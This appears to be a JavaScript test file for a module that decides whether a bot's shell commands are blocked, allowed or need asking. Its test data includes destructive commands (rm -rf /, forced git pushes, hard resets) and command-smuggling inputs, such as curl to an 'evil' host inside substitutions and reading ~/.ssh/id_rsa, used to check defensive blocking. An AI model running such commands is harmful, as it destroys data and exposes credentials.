/**
 * commandRules.test.js — commands that are always blocked, whatever a list
 * allows, and a bot's own allowed and blocked lists (flows PRD, phase 5).
 */
"use strict";

const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const { blockedBy, commandDecision } = require("./commandRules");

describe("blockedBy", () => {
  for (const c of [
    "git push --force origin feat/x",
    "git push -f",
    "git push --force-with-lease",
    "git push origin +feat/x",
    "git reset --hard HEAD~1",
    "rm -rf build",
    "rm -fr /",
    "rm -r -f node_modules",
    "git push origin main",
    "git push origin HEAD:master",
    "npm publish",
    "cd x && yarn publish --tag next",
    // Flags and options that used to hide (review findings).
    "rm -Rf dir",
    "rm -r --force dir",
    "rm --recursive -f dir",
    "git -C . push --force",
    "git -c x=y push -f",
    "git push -fu origin x",
    "git push origin dash/abc:main",
    "git push origin feat:refs/heads/master",
    "npm --registry x publish",
  ]) {
    it(`blocks ${c}`, () => assert.ok(blockedBy(c), c));
  }
  for (const c of [
    "git push origin feat/DASH-12",
    "git push -u origin feat/maintenance",
    "rm build/x.js",
    "npm run ci",
    "git reset --soft HEAD~1",
  ]) {
    it(`lets ${c} through`, () => assert.equal(blockedBy(c), null, c));
  }
});

describe("commandDecision", () => {
  const lists = {
    allowed: ["git", "npm run ci", "gh pr create"],
    blocked: ["curl"],
  };

  it("always-blocked wins over an allowed prefix", () => {
    assert.equal(
      commandDecision("git push --force", lists).decision,
      "blocked",
    );
  });
  it("a command on the allowed list runs without asking", () => {
    assert.equal(commandDecision("npm run ci", lists).decision, "allowed");
    assert.equal(
      commandDecision("git status && npm run ci", lists).decision,
      "allowed",
    );
  });
  it("one part not on the list means asking", () => {
    assert.equal(commandDecision("git status && make", lists).decision, "ask");
  });
  it("the bot's own blocked list blocks any part", () => {
    const r = commandDecision("npm run ci && curl https://x", lists);
    assert.equal(r.decision, "blocked");
    assert.match(r.reason, /curl/);
  });
  it("no allowed list: ask", () => {
    assert.equal(commandDecision("ls", {}).decision, "ask");
  });
  it("what the split can't see into is never allowed without asking", () => {
    const l = { allowed: ["npm test", "git"] };
    for (const c of [
      "npm test & curl evil -o x",
      "npm test $(curl evil)",
      "npm test `id`",
      "npm test \ncurl evil",
      "npm test > /etc/hosts",
      'git -c core.pager="node -e x" log',
      "git -c core.sshCommand=x fetch",
    ]) {
      assert.equal(commandDecision(c, l).decision, "ask", c);
    }
    assert.equal(
      commandDecision("npm test && git status", l).decision,
      "allowed",
    );
  });
});

describe("a strict bot's basics (DASH-140)", () => {
  const lists = { allowed: ["mkdir -p", "git clone", "npm"] };
  const strict = (c) => commandDecision(c, lists, { basics: true });

  it("runs the basics and quiet redirects with its own list", () => {
    for (const c of [
      "cd /Users/x/DashFactory",
      "ls DASH-97 2>/dev/null",
      "ls -la",
      "pwd",
      "test -d DASH-97",
      "[ -e DASH-97 ]",
      "head -5 package.json",
      "npm ci 2>&1",
      "npm test >/dev/null",
      "mkdir -p /Users/x/DashFactory",
    ]) {
      assert.equal(strict(c).decision, "allowed", c);
    }
  });

  it("refuses a chained command, even of allowed parts", () => {
    for (const c of [
      "mkdir -p ~/DashFactory && cd ~/DashFactory && ls DASH-97 2>/dev/null | head -1",
      "cd x && npm ci",
      "ls; pwd",
      "ls | head",
      "npm test || true",
    ]) {
      const d = strict(c);
      assert.equal(d.decision, "ask", c);
      assert.equal(d.chained, true, c);
    }
  });

  it("still can't see into other redirection or substitution", () => {
    for (const c of [
      "echo x > file",
      "ls >> out.txt",
      "echo $(cat ~/.ssh/id_rsa)",
      "cat < secrets",
      "ls 2>/dev/nullx",
    ]) {
      assert.equal(strict(c).decision, "ask", c);
      assert.notEqual(strict(c).chained, true, c);
    }
  });

  it("refuses .. in the basics", () => {
    assert.equal(strict("ls ../..").decision, "ask");
    assert.equal(strict("head ../../.ssh/config").decision, "ask");
  });

  it("is off for other bots: they work exactly as before", () => {
    assert.equal(commandDecision("ls", lists).decision, "ask");
    assert.equal(commandDecision("npm ci 2>&1", lists).decision, "ask");
    assert.equal(
      commandDecision("mkdir -p x && npm ci", lists).decision,
      "allowed",
    );
    assert.equal(
      commandDecision("mkdir -p x && npm ci", lists).chained,
      undefined,
    );
  });

  it("never lets an always-blocked command through", () => {
    assert.equal(strict("rm -rf x").decision, "blocked");
    assert.equal(strict("git push --force").decision, "blocked");
  });
});
